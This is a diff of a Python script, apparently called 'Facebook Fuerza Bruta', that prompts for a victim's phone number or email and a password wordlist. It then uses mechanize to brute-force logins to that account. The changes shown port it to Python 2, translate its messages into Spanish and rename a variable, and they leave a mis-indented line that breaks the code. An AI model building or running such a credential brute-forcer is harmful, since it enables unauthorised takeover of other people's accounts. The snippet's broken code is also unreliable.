@@ -3,19 +3,19 @@
 import sys
 import random
 import mechanize
-import cookiejar
+import cookielib
 import os
 os.system ("clear")
-
-print(("""
+TUTO = '''
 \033[1;33;40m
  _____      _     __        __
 |_   _|   _| |_ __\ \      / /_ _ _ __ ___ ____
   | || | | | __/ _ \ \ /\ / / _` | '__/ _ \_  /
   | || |_| | || (_) \ V  V / (_| | | |  __// /
   |_| \__,_|\__\___/ \_/\_/ \__,_|_|  \___/___|
-"""))
-print(("""
+  
+'''
+TUTO2 = '''
 \033[1;36;40m
     _____              _                 _
    |  ___|_ _  ___ ___| |__   ___   ___ | | __     | |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
@@ -23,13 +23,12 @@ print(("""
    |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
                   Fuerza Bruta
 
-""").encode('utf-8'))
-
-
-
+'''
+print TUTO
+print TUTO2
 
 email = str(raw_input("telefono o correo de la victima : "))
-passwordlist = str(raw_input("wordlist : "))
+archivo = str(raw_input("wordlist : "))
 
 useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
@@ -78,10 +77,10 @@ def check():
        br.set_handle_redirect(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
     except KeyboardInterrupt:
-       print ("\n[*] Exiting program ..\n")
+       print "\n\n\n Cerrando Programa ..\n"
        sys.exit(1)
     try:
-       list = open(passwordlist, "r")
+       list = open(archivo, "r")
        passwords = list.readlines()
        k = 0
        while k < len(passwords):
@@ -100,21 +99,24 @@ def check():
 """).encode('utf-8'))
         sys.exit(1)
     except KeyboardInterrupt:
-        print ("\n [*] Exiting program ..\n")
+        print "\n\n\n Cerrando Programa ..\n"
         sys.exit(1)
     try:
-        
-        print (" [*] Atacando cuenta : %s  + email ") 
-        print (" [*] Cargando :" , len(passwords), "passwords")
-        print (" [*] Cracking, espera un momento ...")
+ 
+os.system ("clear")
+        print TUTO
+        print TUTO2
+        print "\n\n\n  Atacando Cuenta : %s" % (email)
+        print "\n\n\n Cargando :" , len(passwords), "contraseñas"
+        print "\n\n\n\n\n\n, Espera un momento ..."
     except KeyboardInterrupt:
-        print ("\n [*] Exiting program ..\n")
+        print ("\n\n\n Cerrando Programa ..\n")
         sys.exit(1)
     try:
         search()
         attack(password)
     except KeyboardInterrupt:
-        print ("\n [*] Exiting program ..\n")
+        print ("\n\n\n Cerrando Programa..\n")
         sys.exit(1)
 
 if __name__ == '__main__':
